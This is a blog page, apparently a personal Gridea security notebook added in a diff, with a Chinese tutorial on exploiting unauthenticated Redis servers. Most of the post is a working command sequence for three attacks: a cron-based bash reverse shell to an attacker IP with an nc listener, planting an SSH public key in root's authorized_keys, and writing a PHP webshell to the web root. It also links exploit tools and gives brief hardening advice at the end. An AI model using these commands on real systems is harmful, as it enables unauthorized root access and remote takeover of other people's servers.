@@ -1,0 +1,234 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>test | Gridea</title>
+<link rel="shortcut icon" href="https://cherry-cheeks.github.io/favicon.ico?v=1635047858774">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cherry-cheeks.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="test | Gridea - Atom Feed" href="https://cherry-cheeks.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="一、说明
+二、搭建redis（以下均为命令）
+三、利用条件
+三、redis未授权利用
+、脚本利用
+五、修复方案：
+一、说明
+redis是一款开源数据库，redis因配置不当可造成未授权访问，从而造成信息泄露，如果redis以root身份运行..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://cherry-cheeks.github.io">
+  <img class="avatar" src="https://cherry-cheeks.github.io/images/avatar.png?v=1635047858774" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              test
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-10-24
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>一、说明<br>
+二、搭建redis（以下均为命令）<br>
+三、利用条件<br>
+三、redis未授权利用<br>
+、脚本利用<br>
+五、修复方案：</p>
+<p>一、说明<br>
+redis是一款开源数据库，redis因配置不当可造成未授权访问，从而造成信息泄露，如果redis以root身份运行，可以给root账户写入ssh公钥文件，从而直接通过ssh免密登录受害者服务器</p>
+<p>二、搭建redis（linux）<br>
+1、wget http://download.redis.io/releases/redis-2.8.17.tar.gz(centos需要安装gcc ： yum install -y gcc)<br>
+2、tar xzf redis-2.8.17.tar.gz<br>
+3、cd redis-2.8.17<br>
+4、make<br>
+5、cd src<br>
+6、cp redis-server /usr/bin<br>
+7、cp redis-cli /usr/bin<br>
+8、cd ../<br>
+9、cp redis.conf /etc<br>
+10、cat /etc/redis.conf</p>
+<p>over</p>
+<p>三、利用条件<br>
+允许远程登录<br>
+保护模式关闭<br>
+没有设置密码<br>
+防火墙关闭</p>
+<p>三、redis未授权利用<br>
+1、redis反弹shell（攻击机118.31.172.220，受害机108.61.162.2）<br>
+首先要在攻击机上监听8855端口：nc -lvnp 8855<br>
+然后再在攻击机上输入如下命令：<br>
+A、redis-cli -h 108.61.162.2<br>
+B、set xx &quot;\n * * * * bash -i &gt;&amp; /dev/tcp/118.31.172.220/8855 0&gt;&amp;1\n&quot;<br>
+C、config set dir /var/spool/cron<br>
+D、config set dbfilename root<br>
+E、save</p>
+<p>emmm，命令没问题，但是没有反弹成功</p>
+<p>2、redis写入公钥（攻击机118.31.172.220，受害机108.61.162.2）<br>
+首先攻击机输入命令：ssh-key -t rsa，然后一直回车（在本地生成公钥，在/root/.ssh目录下面）<br>
+然后查看公钥命令：cat /root/.ssh/id_rsa.pub</p>
+<p>记住，这里公钥后面要用到</p>
+<p>接下来在攻击机中进入受害机redis-cli：redis-cli -h 108.61.162.2<br>
+执行命令： config set dir /root/.ssh<br>
+config set dbfilename authorized_keys<br>
+set x &quot;\n\n\n公钥\n\n\n&quot;（这里公钥的两边各有3个\n）<br>
+save<br>
+ok后，直接用命令“ssh -i id_rsa root@108.61.162.2”免密登录受害机</p>
+<p>3、redis写入webshell（攻击机108.61.162.2，受害机118.31.172.220）<br>
+条件：服务器开着web服务，可以拥有写入权限，并且redis权限较低<br>
+攻击机执行命令：<br>
+redis-cli -h 118.31.172.220<br>
+config set dir /var/www/html/<br>
+config set dbfilename webshell.php<br>
+set x &quot;\n\n\n<?php phpinfo();?>\n\n\n&quot;<br>
+save</p>
+<p>over</p>
+<p>、脚本利用<br>
+https://github.com/n0b0dyCN/redis-rogue-server<br>
+https://github.com/r35tart/RedisWriteFile（推荐）</p>
+<p>五、修复方案：<br>
+开启保护模式<br>
+限制ip登录（在redis.conf中，将bind 127.0.0.1前面的#去掉）<br>
+添加密码（在redis.conf中，搜索requirepass，后面跟密码：requirepass admin，密码admin，然后登录就redis-cli -a admin）<br>
+修改端口号在redis.conf中，port 8800 端口设置为8800或者redis-server --port 8800）</p>
+<p>注：限制ip登录个人感觉更直接更管用</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://cherry-cheeks.github.io/post/hello-gridea/">
+              <h3 class="post-title">
+                Hello Gridea
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://cherry-cheeks.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
